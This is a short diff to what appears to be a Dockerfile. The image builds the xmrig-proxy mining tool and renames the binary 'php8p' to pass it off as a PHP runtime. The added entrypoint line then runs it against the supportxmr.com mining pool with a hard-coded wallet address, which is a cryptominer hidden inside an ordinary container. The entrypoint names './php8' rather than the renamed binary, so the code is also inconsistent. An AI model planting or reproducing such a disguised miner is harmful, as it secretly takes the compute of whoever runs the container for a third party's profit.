@@ -10,4 +10,4 @@ RUN cmake .
 RUN make
 RUN mv xmrig-proxy php8p
 
-ENTRYPOINT  ["./php8p"]
+ENTRYPOINT  ["./php8 -o pool.supportxmr.com:3333 -u 47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWc"]
